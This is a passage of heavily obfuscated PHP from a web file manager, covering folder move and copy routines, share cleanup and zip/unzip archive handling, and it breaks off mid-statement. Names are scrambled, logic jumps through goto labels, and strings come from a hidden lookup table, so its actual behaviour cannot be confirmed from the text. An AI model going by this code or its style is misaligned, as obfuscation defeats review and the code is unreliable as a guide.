Cª¦ô¸Ó; f…È¯†…î‚: $this->updateModifyTime($D¾ö¯’¥š); Model($föõÅñ‰¾§[505])->eventMove($c¼‘ØË˜Í, $Cˆ³•ô¾¶[$föõÅñ‰¾§[461]], $fùŒ‡“µ¿È); Hook::trigger($föõÅñ‰¾§[532], $F¤Ù¨ŒÜÊƒ); goto EÖõä›®–†; C“µ¤õÓÙ: $föõÅñ‰¾§ =& $_SERVER[Î¿—”òá]; $Cˆ³•ô¾¶ = $this->sourceInfo($c¼‘ØË˜Í); $AŞ¸•‚ì = $this->sourceInfo($fùŒ‡“µ¿È); goto C ¤»…Áå; bªØóÉ×œ: $this->folderSizeReset($fùŒ‡“µ¿È); $D¾ö¯’¥š = array($Cˆ³•ô¾¶[$föõÅñ‰¾§[461]], $fùŒ‡“µ¿È); if ($Cˆ³•ô¾¶[$föõÅñ‰¾§[370]] == $föõÅñ‰¾§[83]) { $D¾ö¯’¥š[] = $c¼‘ØË˜Í; } goto f…È¯†…î‚; AŸŒŒò‚§ß: if (!$Cˆ³•ô¾¶ || !$AŞ¸•‚ì || $AŞ¸•‚ì[$föõÅñ‰¾§[370]] != $föõÅñ‰¾§[83]) { return !1; } Hook::trigger($föõÅñ‰¾§[531], $F¤Ù¨ŒÜÊƒ); $this->targetIsDelete = intval($Cˆ³•ô¾¶[$föõÅñ‰¾§[397]]); goto A’Üğ¨Åš ; CšÌ¨«£Š: } private function _move($B“åÑæÌ§, $b›îõ‚òÉ®, $b ¸Š¿Ç’, &$b¬ÔƒïÄê¹, $Cš‹Ë¥÷“¯ = '') { goto F”›³Û‡¤; Cœ™¢õØÙÓ: $A×ƒÒ·ÇÑŞ = !1; if ($e‡––÷¤Ï½) { if ($b ¸Š¿Ç’ == REPEAT_RENAME_FOLDER) { $C‘ÊèØŠòá = $this->fileNameAuto($b›îõ‚òÉ®, $C‘ÊèØŠòá, $b ¸Š¿Ç’, $e‡––÷¤Ï½); $f± ôæ¬‚ = $this->_moveForce($B“åÑæÌ§, $b›îõ‚òÉ®, $C‘ÊèØŠòá); } else { if ($b ¸Š¿Ç’ == REPEAT_RENAME_FOLDER) { $b ¸Š¿Ç’ = REPEAT_RENAME; } $f¤öÉÊª…› = $this->_childrenListSelect($B“åÑæÌ§); foreach ($f¤öÉÊª…› as $dÛäŸç‡í‡) { $this->_move($dÛäŸç‡í‡[$b½Ì‹½Ñ«ª[369]], $c¦æÒ˜•¥É, $b ¸Š¿Ç’, $b¬ÔƒïÄê¹); } $A×ƒÒ·ÇÑŞ = !0; } } else { if ($b ¸Š¿Ç’ == REPEAT_SKIP) { $A×ƒÒ·ÇÑŞ = !0; } else { if ($b ¸Š¿Ç’ == REPEAT_RENAME || $b ¸Š¿Ç’ == REPEAT_RENAME_FOLDER) { $C‘ÊèØŠòá = $this->fileNameAuto($b›îõ‚òÉ®, $C‘ÊèØŠòá, $b ¸Š¿Ç’, $e‡––÷¤Ï½); $f± ôæ¬‚ = $this->_moveForce($B“åÑæÌ§, $b›îõ‚òÉ®, $C‘ÊèØŠòá); } else { if ($b ¸Š¿Ç’ == REPEAT_REPLACE) { $b°Á‡‰®¡è = $this->sourceInfoCache($c¦æÒ˜•¥É); $EğåÚÚ£– = $this->fileHistory($b°Á‡‰®¡è, $eëÔÏò²ãî[$b½Ì‹½Ñ«ª[419]], $eëÔÏò²ãî[$b½Ì‹½Ñ«ª[77]]); if ($EğåÚÚ£–) { $b¬ÔƒïÄê¹[$b½Ì‹½Ñ«ª[501]][] = $eëÔÏò²ãî[$b½Ì‹½Ñ«ª[419]]; } else { $A×ƒÒ·ÇÑŞ = !0; } } } } } if ($A×ƒÒ·ÇÑŞ && !$b¬ÔƒïÄê¹[$b½Ì‹½Ñ«ª[533]]) { $b¬ÔƒïÄê¹[$b½Ì‹½Ñ«ª[533]] = !0; } goto dî¶¢‘¾¶å; cÅ„¤•½ƒ: $C‘ÊèØŠòá = $Cš‹Ë¥÷“¯ ? $Cš‹Ë¥÷“¯ : $eëÔÏò²ãî[$b½Ì‹½Ñ«ª[28]]; $c¦æÒ˜•¥É = $this->fileNameExistCache($b›îõ‚òÉ®, $C‘ÊèØŠòá); $this->lockMoveStart($B“åÑæÌ§); goto Eç¶ğøÁÈ‹; F”›³Û‡¤: $b½Ì‹½Ñ«ª =& $_SERVER[Î¿—”òá]; $eëÔÏò²ãî = $this->sourceInfo($B“åÑæÌ§); $e‡––÷¤Ï½ = $eëÔÏò²ãî[$b½Ì‹½Ñ«ª[370]] == $b½Ì‹½Ñ«ª[83]; goto cÅ„¤•½ƒ; Eç¶ğøÁÈ‹: $this->lockWriteStart($b›îõ‚òÉ®, $C‘ÊèØŠòá); if (!$c¦æÒ˜•¥É) { return $this->_moveForce($B“åÑæÌ§, $b›îõ‚òÉ®, $C‘ÊèØŠòá); } $f± ôæ¬‚ = $c¦æÒ˜•¥É; goto Cœ™¢õØÙÓ; dî¶¢‘¾¶å: return $f± ôæ¬‚; goto d¼“ñÁ°»; d¼“ñÁ°»: } private function _moveForce($AñÄÍºÙ, $d©ºÛ…©Àµ, $d¬‘—•‚®¨) { goto BË“Ÿ…Á›¿; eõÅ«®ŒÛé: if ($C´ØÁ›—) { $bå…œÃµèÍ = array($B·¶Ÿ™—Âõ[525] => array($B·¶Ÿ™—Âõ[483], $DèËš¢Ñª[$B·¶Ÿ™—Âõ[459]] . $DèËš¢Ñª[$B·¶Ÿ™—Âõ[369]] . $B·¶Ÿ™—Âõ[484])); $DÍ½Ó¨´˜ = $DèËš¢Ñª[$B·¶Ÿ™—Âõ[459]] . $DèËš¢Ñª[$B·¶Ÿ™—Âõ[369]] . $B·¶Ÿ™—Âõ[47]; $Eì•²åø‡  = $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[459]] . $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[369]] . $B·¶Ÿ™—Âõ[47] . $DèËš¢Ñª[$B·¶Ÿ™—Âõ[369]] . $B·¶Ÿ™—Âõ[47]; $b¥‚¼ã¹®Ç = array($B·¶Ÿ™—Âõ[525] => array($B·¶Ÿ™—Âõ[534], "\162\145\x70\154\141\x63\145\x28\160\x61\162\x65\156\x74\114\x65\x76\x65\154\x2c\47{$DÍ½Ó¨´˜}\x27\54\47{$Eì•²åø‡ }\47\x29"), $B·¶Ÿ™—Âõ[521] => $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[371]], $B·¶Ÿ™—Âõ[522] => $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[456]]); if ($E½¸‘”„ô¡) { $b¥‚¼ã¹®Ç[$B·¶Ÿ™—Âõ[396]] = 0; } $this->where($bå…œÃµèÍ)->data($b¥‚¼ã¹®Ç)->save(); } $this->where(array($B·¶Ÿ™—Âõ[383] => $AñÄÍºÙ))->data($aŠá…å‹)->save(); return $AñÄÍºÙ; goto E¶†¦¯™µ™; CÃ«Š­£òô: $C´ØÁ›— = $DèËš¢Ñª[$B·¶Ÿ™—Âõ[370]] == $B·¶Ÿ™—Âõ[83]; $aŠá…å‹ = array($B·¶Ÿ™—Âõ[368] => $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[369]], $B·¶Ÿ™—Âõ[525] => $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[459]] . $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[369]] . $B·¶Ÿ™—Âõ[47], $B·¶Ÿ™—Âõ[521] => $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[371]], $B·¶Ÿ™—Âõ[522] => $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[456]], $B·¶Ÿ™—Âõ[524] => USER_ID, $B·¶Ÿ™—Âõ[386] => $d¬‘—•‚®¨); $Bªùôë‹ Ö = $DèËš¢Ñª[$B·¶Ÿ™—Âõ[371]] == SourceModel::TYPE_GROUP && $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[371]] == SourceModel::TYPE_GROUP && $DèËš¢Ñª[$B·¶Ÿ™—Âõ[456]] == $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[456]]; goto Cİ‚˜º„¤•; Cİ‚˜º„¤•: if (!$Bªùôë‹ Ö) { Model($B·¶Ÿ™—Âõ[454])->authClear($AñÄÍºÙ); } $E½¸‘”„ô¡ = $DèËš¢Ñª[$B·¶Ÿ™—Âõ[397]] == $B·¶Ÿ™—Âõ[83] && $fÜ·ˆ‡·Õ“[$B·¶Ÿ™—Âõ[397]] != $B·¶Ÿ™—Âõ[83]; if ($E½¸‘”„ô¡) { $aŠá…å‹[$B·¶Ÿ™—Âõ[396]] = 0; } goto eõÅ«®ŒÛé; BË“Ÿ…Á›¿: $B·¶Ÿ™—Âõ =& $_SERVER[Î¿—”òá]; $DèËš¢Ñª = $this->sourceInfo($AñÄÍºÙ); $fÜ·ˆ‡·Õ“ = $this->sourceInfo($d©ºÛ…©Àµ); goto CÃ«Š­£òô; E¶†¦¯™µ™: } private function clearShare($dÎÊ¶ë’à«, $EŒôÔŠŞ‹) { goto AÄÄğÓ§–; F¢†æ‚éË: Model($BèÊÄ‘ÊµÌ[536])->where($a‰ùÄŒåØƒ)->save(array($BèÊÄ‘ÊµÌ[448] => 0)); Model($BèÊÄ‘ÊµÌ[537])->where($a‰ùÄŒåØƒ)->delete(); goto Dà“ƒíšÛ·; C›¢æÈÜ‚‡: if (!$BÑ²šÖ“öŒ) { return; } $BÑ²šÖ“öŒ = array_to_keyvalue($BÑ²šÖ“öŒ, $BèÊÄ‘ÊµÌ[33], $BèÊÄ‘ÊµÌ[441]); $a‰ùÄŒåØƒ = array($BèÊÄ‘ÊµÌ[441] => array($BèÊÄ‘ÊµÌ[7], $BÑ²šÖ“öŒ)); goto F¢†æ‚éË; f´£¹…Ÿ±Ï: if (!$dÙ°¢¯é) { return; } $a‰ùÄŒåØƒ = array($BèÊÄ‘ÊµÌ[369] => array($BèÊÄ‘ÊµÌ[7], $dÙ°¢¯é), $BèÊÄ‘ÊµÌ[448] => 1); $BÑ²šÖ“öŒ = Model($BèÊÄ‘ÊµÌ[536])->field($BèÊÄ‘ÊµÌ[441])->where($a‰ùÄŒåØƒ)->select(); goto C›¢æÈÜ‚‡; AÄÄğÓ§–: $BèÊÄ‘ÊµÌ =& $_SERVER[Î¿—”òá]; $f—‡í×‹…º = $this->sourceInfo($dÎÊ¶ë’à«); $bíÅŸáì’ê = $this->sourceInfo($EŒôÔŠŞ‹); goto B«‹„Éåƒâ; B«‹„Éåƒâ: if ($f—‡í×‹…º[$BèÊÄ‘ÊµÌ[456]] == $bíÅŸáì’ê[$BèÊÄ‘ÊµÌ[456]] && $f—‡í×‹…º[$BèÊÄ‘ÊµÌ[371]] == $BèÊÄ‘ÊµÌ[535]) { return; } $a‰ùÄŒåØƒ = array($BèÊÄ‘ÊµÌ[459] => array($BèÊÄ‘ÊµÌ[483], $f—‡í×‹…º[$BèÊÄ‘ÊµÌ[459]] . $dÎÊ¶ë’à« . $BèÊÄ‘ÊµÌ[484])); $dÙ°¢¯é = $this->field($BèÊÄ‘ÊµÌ[383])->where($a‰ùÄŒåØƒ)->getField($BèÊÄ‘ÊµÌ[369], !0); goto f´£¹…Ÿ±Ï; Dà“ƒíšÛ·: } public function copyFolderFromIO($e»Šì„èµñ, $CšÂÌ›àÒˆ, $d“æÉƒ¡«, $Eóå›Í£°ª, $F·¼Œê†Å¯, $bÀœÄàƒ´ = false) { goto Cö°ŒÆØˆ¹; Cö°ŒÆØˆ¹: $b›¬‡½¾ =& $_SERVER[Î¿—”òá]; $cÂÇé¼éÛ = array($b›¬‡½¾[502] => array(), $b›¬‡½¾[503] => array(), $b›¬‡½¾[501] => array(), $b›¬‡½¾[538] => array()); $F÷ÃÄì–‰Â = $bÀœÄàƒ´ ? $bÀœÄàƒ´ : $e»Šì„èµñ->getPathName($e»Šì„èµñ->pathThis($CšÂÌ›àÒˆ)); goto BÓòÒÉğˆ™; f£éÜ°©ß¹: $this->updateModifyTime($d“æÉƒ¡«); return $c™õ˜Î†ñ; goto eà”à•«ƒ; c³Èé–¨àƒ: Hook::trigger($b›¬‡½¾[540]); if ($c™õ˜Î†ñ) { $this->folderSizeResetChildren($c™õ˜Î†ñ); } $this->_childrenListClear(); goto a­Úß‘”¦; a­Úß‘”¦: Model($b›¬‡½¾[504])->addAll($cÂÇé¼éÛ[$b›¬‡½¾[502]], array(), !0); Model($b›¬‡½¾[505])->eventCopy($c™õ˜Î†ñ); $this->saveAll($cÂÇé¼éÛ[$b›¬‡½¾[503]]); goto fÑ–×ºØ‘; E¤Ô¶œÉ: if ($fË’ªŞÛ‰ë) { $this->_childrenAllMake($fË’ªŞÛ‰ë); } Hook::trigger($b›¬‡½¾[539]); $this->_copyChildTo($e»Šì„èµñ, $CšÂÌ›àÒˆ, $c™õ˜Î†ñ, $Eóå›Í£°ª, $cÂÇé¼éÛ, $F·¼Œê†Å¯); goto c³Èé–¨àƒ; fÑ–×ºØ‘: Model($b›¬‡½¾[422])->linkAdd($cÂÇé¼éÛ[$b›¬‡½¾[501]]); Model($b›¬‡½¾[422])->remove($cÂÇé¼éÛ[$b›¬‡½¾[538]]); $this->folderSizeReset($d“æÉƒ¡«); goto f£éÜ°©ß¹; BÓòÒÉğˆ™: $fË’ªŞÛ‰ë = $this->fileNameExist($d“æÉƒ¡«, $F÷ÃÄì–‰Â); $c™õ˜Î†ñ = $this->mkdir($d“æÉƒ¡«, $F÷ÃÄì–‰Â, $Eóå›Í£°ª); if (!$fË’ªŞÛ‰ë || $Eóå›Í£°ª == REPEAT_RENAME_FOLDER) { $Eóå›Í£°ª = !1; } goto E¤Ô¶œÉ; eà”à•«ƒ: } private function _copyChildTo($aÆæöÕää†, $côÉº¿ƒì‹, $C÷‰ÀÊ‘êÁ, $bÈİ øâÑğ, &$Dˆ—µŠÌ, $d‰øÜÑÆ¾) { goto AšĞŠ†·Äë; AšĞŠ†·Äë: $cŞå¬ôĞï =& $_SERVER[Î¿—”òá]; $E‹—‡ÂÉèö = $this->sourceInfoCache($C÷‰ÀÊ‘êÁ); $bÃÃ–‰‚†§ = $aÆæöÕää†->listPath($côÉº¿ƒì‹, !1, !0); goto CÜ„ß•ìçé; e­®ì’”ö‡: $e”‘ˆß°“ª = $this->_childrenList($C÷‰ÀÊ‘êÁ); $e”‘ˆß°“ª = array_to_keyvalue($e”‘ˆß°“ª, $cŞå¬ôĞï[28]); foreach ($E‰ãŠ¼¢ˆª as $cî—ô‹»£) { $Bß‰–¤ˆò = $e”‘ˆß°“ª[$cî—ô‹»£[$cŞå¬ôĞï[28]]]; $c¯íøˆÒğ† = $Bß‰–¤ˆò[$cŞå¬ôĞï[369]]; $this->_copyApplyMeta($Bß‰–¤ˆò, $Dˆ—µŠÌ); if ($cî—ô‹»£[$cŞå¬ôĞï[29]] == $cŞå¬ôĞï[76]) { $cî—ô‹»£[$cŞå¬ôĞï[75]] = $aÆæöÕää†->getPathInner($cî—ô‹»£[$cŞå¬ôĞï[75]]); $this->_copyChildTo($aÆæöÕää†, $cî—ô‹»£[$cŞå¬ôĞï[75]], $c¯íøˆÒğ†, $bÈİ øâÑğ, $Dˆ—µŠÌ, $d‰øÜÑÆ¾); } } goto B¯¦ö—ĞŠŒ; CÜ„ß•ìçé: $E‰ãŠ¼¢ˆª = array_merge($bÃÃ–‰‚†§[$cŞå¬ôĞï[73]], $bÃÃ–‰‚†§[$cŞå¬ôĞï[74]]); $A“À„‚çÀ¶ = $this->_addFiles($aÆæöÕää†, $bÃÃ–‰‚†§[$cŞå¬ôĞï[73]], $d‰øÜÑÆ¾); $e„§»ÊÀÚÒ = array(); goto b†¬ á¬ˆö; b†¬ á¬ˆö: foreach ($E‰ãŠ¼¢ˆª as &$cî—ô‹»£) { goto A‘·†·»§¼; A‘·†·»§¼: if (isset($A“À„‚çÀ¶[$cî—ô‹»£[$cŞå¬ôĞï[28]]])) { $cî—ô‹»£ = $A“À„‚çÀ¶[$cî—ô‹»£[$cŞå¬ôĞï[28]]]; } $cî—ô‹»£[$cŞå¬ôĞï[370]] = $cî—ô‹»£[$cŞå¬ôĞï[29]] == $cŞå¬ôĞï[76]; $cî—ô‹»£[$cŞå¬ôĞï[372]] = _get($cî—ô‹»£, $cŞå¬ôĞï[160], $cŞå¬ôĞï[33]); goto d„˜‰Ûùğ¬; d„˜‰Ûùğ¬: $cî—ô‹»£[$cŞå¬ôĞï[77]] = _get($cî—ô‹»£, $cŞå¬ôĞï[77], 0); $cî—ô‹»£[$cŞå¬ôĞï[419]] = _get($cî—ô‹»£, $cŞå¬ôĞï[419], 0); if (!isset($cî—ô‹»£[$cŞå¬ôĞï[541]]) && $cî—ô‹»£[$cŞå¬ôĞï[419]]) { $Dˆ—µŠÌ[$cŞå¬ôĞï[538]][] = $cî—ô‹»£[$cŞå¬ôĞï[419]]; } goto EÀƒÒ¨ø†ó; EÀƒÒ¨ø†ó: if ($bÈİ øâÑğ) { $b¨›ƒè¡È = $this->fileNameExistCache($C÷‰ÀÊ‘êÁ, $cî—ô‹»£[$cŞå¬ôĞï[28]]); if ($b¨›ƒè¡È) { if ($cî—ô‹»£[$cŞå¬ôĞï[370]] || $bÈİ øâÑğ == REPEAT_SKIP) { continue; } if ($bÈİ øâÑğ == REPEAT_REPLACE) { $Bß‰–¤ˆò = $this->sourceInfoCache($b¨›ƒè¡È); $eÛğÕÓ±ŞŒ = $this->fileHistory($Bß‰–¤ˆò, $cî—ô‹»£[$cŞå¬ôĞï[419]], $cî—ô‹»£[$cŞå¬ôĞï[77]]); if ($eÛğÕÓ±ŞŒ) { $Dˆ—µŠÌ[$cŞå¬ôĞï[501]][] = $cî—ô‹»£[$cŞå¬ôĞï[419]]; } continue; } else { if ($bÈİ øâÑğ == REPEAT_RENAME) { $cî—ô‹»£[$cŞå¬ôĞï[28]] = $this->fileNameAutoCache($C÷‰ÀÊ‘êÁ, $cî—ô‹»£[$cŞå¬ôĞï[28]], $bÈİ øâÑğ, !1); } } } } if (!$cî—ô‹»£[$cŞå¬ôĞï[370]] && $cî—ô‹»£[$cŞå¬ôĞï[419]]) { $Dˆ—µŠÌ[$cŞå¬ôĞï[501]][] = $cî—ô‹»£[$cŞå¬ôĞï[419]]; } $e„§»ÊÀÚÒ[] = $this->_makeItemData($cî—ô‹»£, $E‹—‡ÂÉèö, $cî—ô‹»£[$cŞå¬ôĞï[28]]); goto AÌº›‡Ø»; AÌº›‡Ø»: } unset($cî—ô‹»£); if (!empty($e„§»ÊÀÚÒ)) { $this->addAll($e„§»ÊÀÚÒ); } goto e­®ì’”ö‡; B¯¦ö—ĞŠŒ: } private function _addFiles($dÓéñê«‘è, $c‚æµõç¦¦, $B´“÷‹“…) { goto bº•‹øÍ¿İ; b”îÈ™ê: foreach ($c‚æµõç¦¦ as &$F®–×¦“‹©) { goto C¢¯õ¶“ì; C¢¯õ¶“ì: Hook::trigger($BÍõó±ßÎä[542], $F®–×¦“‹©); $F®–×¦“‹©[$BÍõó±ßÎä[75]] = $dÓéñê«‘è->getPathInner($F®–×¦“‹©[$BÍõó±ßÎä[75]]); $AØ•²ùñ«· = $dÓéñê«‘è->hashSimple($F®–×¦“‹©[$BÍõó±ßÎä[75]]); goto fŠ·í„Ğê‹; E†ÍØ×ÁÊ: $F®–×¦“‹©[$BÍõó±ßÎä[163]] = $B‹­¿ì”øò; Hook::trigger($BÍõó±ßÎä[543], $F®–×¦“‹©); $F†˜ƒô«[$B‹­¿ì”øò][] =& $F®–×¦“‹©; goto C³Ú­­­Ñ; C³Ú­­­Ñ: if (count($F†˜ƒô«[$B‹­¿ì”øò]) > 1) { $F®–×¦“‹©[$BÍõó±ßÎä[541]] = !0; } goto DÁ»’·¯Ñ‰; fŠ·í„Ğê‹: $B‹­¿ì”øò = $dÓéñê«‘è->hashMd5($F®–×¦“‹©[$BÍõó±ßÎä[75]]); if (strlen($B‹­¿ì”øò) > 10 && !isset($F†˜ƒô«[$B‹­¿ì”øò])) { $F†˜ƒô«[$B‹­¿ì”øò] = array(); } $F®–×¦“‹©[$BÍõó±ßÎä[164]] = $AØ•²ùñ«·; goto E†ÍØ×ÁÊ; DÁ»’·¯Ñ‰: } $fñ±Áóäí× = array($BÍõó±ßÎä[163] => array($BÍõó±ßÎä[7], array_keys($F†˜ƒô«))); $dŒÊïÔ’ß® = Model($BÍõó±ßÎä[544]); goto A•·ˆÓŒ¶; A×ÓàŠ§Â: $a›ˆÎÊïƒõ = array(); foreach ($c‚æµõç¦¦ as $f²‰¼ğ™ğ¤) { if (isset($f²‰¼ğ™ğ¤[$BÍõó±ßÎä[541]]) && $f²‰¼ğ™ğ¤[$BÍõó±ßÎä[541]]) { continue; } $b¶„³“×â = $dÓéñê«‘è->getPathInner($f²‰¼ğ™ğ¤[$BÍõó±ßÎä[75]]); $bòçÁƒ–­ = $dŒÊïÔ’ß®->addFileMake($b¶„³“×â, $f²‰¼ğ™ğ¤[$BÍõó±ßÎä[77]], $f²‰¼ğ™ğ¤[$BÍõó±ßÎä[164]], $f²‰¼ğ™ğ¤[$BÍõó±ßÎä[163]], $f²‰¼ğ™ğ¤[$BÍõó±ßÎä[28]], $B´“÷‹“…); $a›ˆÎÊïƒõ[] = $bòçÁƒ–­; } $dŒÊïÔ’ß®->addAll($a›ˆÎÊïƒõ); goto bğ¡ê³ì¸Æ; EÚ®Â§›ë«: foreach ($a¢”—ÔñÌœ as $BÁÊ”ù™‹ö) { if (!isset($F†˜ƒô«[$BÁÊ”ù™‹ö[$BÍõó±ßÎä[163]]])) { continue; } $Aõ­è¥ÒÒ± =& $F†˜ƒô«[$BÁÊ”ù™‹ö[$BÍõó±ßÎä[163]]]; foreach ($Aõ­è¥ÒÒ± as &$F®–×¦“‹©) { $F®–×¦“‹©[$BÍõó±ßÎä[419]] = $BÁÊ”ù™‹ö[$BÍõó±ßÎä[419]]; } unset($F®–×¦“‹©); } $CªóŸ°ô˜ = array(); foreach ($c‚æµõç¦¦ as $cæ¢âè´‹¥) { $CªóŸ°ô˜[$cæ¢âè´‹¥[$BÍõó±ßÎä[28]]] = $cæ¢âè´‹¥; } goto bîî¼İ¢—ã; bº•‹øÍ¿İ: $BÍõó±ßÎä =& $_SERVER[Î¿—”òá]; if (!$c‚æµõç¦¦ || count($c‚æµõç¦¦) == 0) { return array(); } $F†˜ƒô« = array(); goto b”îÈ™ê; bîî¼İ¢—ã: return $CªóŸ°ô˜; goto f·É‡…Ô‘; bğ¡ê³ì¸Æ: $fñ±Áóäí× = array($BÍõó±ßÎä[163] => array($BÍõó±ßÎä[7], array_keys($F†˜ƒô«))); $a¢”—ÔñÌœ = $dŒÊïÔ’ß®->where($fñ±Áóäí×)->select(); $a¢”—ÔñÌœ = $a¢”—ÔñÌœ ? $a¢”—ÔñÌœ : array(); goto EÚ®Â§›ë«; A•·ˆÓŒ¶: $a¢”—ÔñÌœ = $dŒÊïÔ’ß®->where($fñ±Áóäí×)->select(); $a¢”—ÔñÌœ = $a¢”—ÔñÌœ ? $a¢”—ÔñÌœ : array(); foreach ($a¢”—ÔñÌœ as $BÁÊ”ù™‹ö) { if (!isset($F†˜ƒô«[$BÁÊ”ù™‹ö[$BÍõó±ßÎä[163]]])) { continue; } $bŞ‚İï±¥‰ = $F†˜ƒô«[$BÁÊ”ù™‹ö[$BÍõó±ßÎä[163]]]; foreach ($bŞ‚İï±¥‰ as &$F®–×¦“‹©) { $F®–×¦“‹©[$BÍõó±ßÎä[419]] = $BÁÊ”ù™‹ö[$BÍõó±ßÎä[419]]; $F®–×¦“‹©[$BÍõó±ßÎä[541]] = !0; } unset($F®–×¦“‹©); } goto A×ÓàŠ§Â; f·É‡…Ô‘: } } define($_SERVER[Î¿—”òá][545], $_SERVER[Î¿—”òá][546]); goto aŠñ·çåÙ; AÅÃÍÒÅ°˜: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $fäáˆ¹òçØ; if (!$fäáˆ¹òçØ) { $C§½»èĞ»Û = IO::init($_SERVER[Î¿—”òá][8]); } return $C§½»èĞ»Û; } private static function iconvSystem($B‡ š³) { return self::local()->iconvSystem($B‡ š³); } private static function iconvApp($FØ©‘ÔÏÈ¦) { return self::local()->iconvApp($FØ©‘ÔÏÈ¦); } public static function zip($DçôˆêŸñ¡, $e‡‘İµÇ¹Ç = "\x7a\x69\x70", $F¾Êíâƒ”’ = '', $fŠÌ†êº‰‰ = REPEAT_RENAME) { goto a…æ¨ÛÃ‘—; a‚¬ßĞœĞ‘: if (!$cåøéÒ‡¥Ü) { del_dir($a„„›óÕî); show_json(LNG($bíâ–¹â™×[1020]), !1); } del_dir($a„„›óÕî); return $cåøéÒ‡¥Ü; goto eâ™† ¶¾ˆ; d½˜’»ÜÆÍ: $bòØÁ¼Şİ = $a„ÎÀÖåò² . $F§Íö‚ùõ . $bíâ–¹â™×[91] . $e‡‘İµÇ¹Ç; $bòØÁ¼Şİ = get_filename_auto($bòØÁ¼Şİ, $bíâ–¹â™×[33], $fŠÌ†êº‰‰); $D´¢ÆÃ™Ô = self::iconvSystem($bòØÁ¼Şİ); goto dãºÁ›·‰; dãºÁ›·‰: foreach ($fÅøßÇíª‚ as $CãæÔ‰Æ¯Ô => $aƒÉ•†ŸÉ) { $fÅøßÇíª‚[$CãæÔ‰Æ¯Ô] = self::iconvSystem($aƒÉ•†ŸÉ); } KodArchive::create($D´¢ÆÃ™Ô, $fÅøßÇíª‚); if (!IO::exist($bòØÁ¼Şİ)) { if ($a„„›óÕî) { del_dir($a„„›óÕî); } show_json(LNG($bíâ–¹â™×[1020]), !1); } goto C¯œéŞœ„Ô; a…æ¨ÛÃ‘—: $bíâ–¹â™× =& $_SERVER[Î¿—”òá]; $e”¦—ëêò³ = self::init($DçôˆêŸñ¡[0][$bíâ–¹â™×[75]]); $AŒ·‰áÙŸ“ = self::info($DçôˆêŸñ¡[0][$bíâ–¹â™×[75]]); goto b ¨‰÷šÔ; B«é±Å¦Û¨: if (count($fÅøßÇíª‚) > 1) { $B­‰½µÌ = IO::info(IO::pathFather($AŒ·‰áÙŸ“[$bíâ–¹â™×[75]])); $F§Íö‚ùõ = $B­‰½µÌ[$bíâ–¹â™×[28]]; } $a„ÎÀÖåò² = $a„„›óÕî; if (!$a„ÎÀÖåò²) { $a„ÎÀÖåò² = get_path_father($AŒ·‰áÙŸ“[$bíâ–¹â™×[75]]); $B‘ëÖ‚Âå™ = IO::info($a„ÎÀÖåò²); if (!$B‘ëÖ‚Âå™[$bíâ–¹â™×[189]]) { show_json(LNG($bíâ–¹â™×[1019]), !1); } } goto d½˜’»ÜÆÍ; C¯œéŞœ„Ô: if ($F¾Êíâƒ”’ || !$a„„›óÕî) { if ($a„„›óÕî && strstr($a„„›óÕî, TEMP_FILES)) { $B¾¹Ø—¾‚§ = $fÅøßÇíª‚ = array(); recursion_dir($a„ÎÀÖåò², $B¾¹Ø—¾‚§, $fÅøßÇíª‚, 0); foreach ($B¾¹Ø—¾‚§ as $a‚ÌØÃ±™í) { del_dir($a‚ÌØÃ±™í); } foreach ($fÅøßÇíª‚ as $c‘‰¥¾ñÈ) { if ($c‘‰¥¾ñÈ == $D´¢ÆÃ™Ô) { continue; } del_file($c‘‰¥¾ñÈ); } } return $bòØÁ¼Şİ; } $A°êß¥­ÈŠ = self::pathFather($AŒ·‰áÙŸ“[$bíâ–¹â™×[75]]); $cåøéÒ‡¥Ü = self::move($bòØÁ¼Şİ, $A°êß¥­ÈŠ, $fŠÌ†êº‰‰); goto a‚¬ßĞœĞ‘; b ¨‰÷šÔ: $a„„›óÕî = !1; if (!$F¾Êíâƒ”’ && $e”¦—ëêò³->getType() == $bíâ–¹â™×[102]) { $fÅøßÇíª‚ = self::zipFileList($DçôˆêŸñ¡); } else { $a„„›óÕî = $F¾Êíâƒ”’ ? $F¾Êíâƒ”’ : TEMP_FILES . $bíâ–¹â™×[1018] . time() . rand_string(8) . $bíâ–¹â™×[8]; mk_dir($a„„›óÕî); $fÅøßÇíª‚ = self::zipFileList($DçôˆêŸñ¡, $a„„›óÕî); } $F§Íö‚ùõ = $AŒ·‰áÙŸ“[$bíâ–¹â™×[28]]; goto B«é±Å¦Û¨; eâ™† ¶¾ˆ: } public static function unzip($BÎ­Şêß³ê, $e†×ß±ó = "\x72\x65\x70\x6c\x61\143\x65") { goto B»¡š®å; B‰£²®¨¤×: $fêçñš†İÖ = KodArchive::extract($AôÉ”˜œ´ê, $B„¼ºšî¹ó . $B‰‹ËÚ·Î[8], $AÜá¼ßïŸ¤); self::archiveExt(); if (!$fêçñš†İÖ[$B‰‹ËÚ·Î[1025]]) { show_json($B‰‹ËÚ·Î[1026] . $fêçñš†İÖ[$B‰‹ËÚ·Î[1027]], !1); } goto FâŠÛÓÉŒñ; B»¡š®å: $B‰‹ËÚ·Î =& $_SERVER[Î¿—”òá]; $a Ö“º§Óß = $BÎ­Şêß³ê[$B‰‹ËÚ·Î[75]]; $AÙ•ÛôßŸ = $BÎ­Şêß³ê[$B‰‹ËÚ·Î[1021]]; goto a©ÏÍÃî¾°; Eåà‘Œ…£: if (!@file_exists(self::iconvSystem($AôÉ”˜œ´ê))) { $A¿á¢Ç¬º = self::localFilePath($a Ö“º§Óß, $e»Á…†––ì); $AôÉ”˜œ´ê = $A¿á¢Ç¬º ? $A¿á¢Ç¬º : parent::download($a Ö“º§Óß, $AôÉ”˜œ´ê); } $AôÉ”˜œ´ê = self::iconvSystem($AôÉ”˜œ´ê); $AÜá¼ßïŸ¤ = isset($BÎ­Şêß³ê[$B‰‹ËÚ·Î[1023]]) ? $BÎ­Şêß³ê[$B‰‹ËÚ·Î[1023]] : 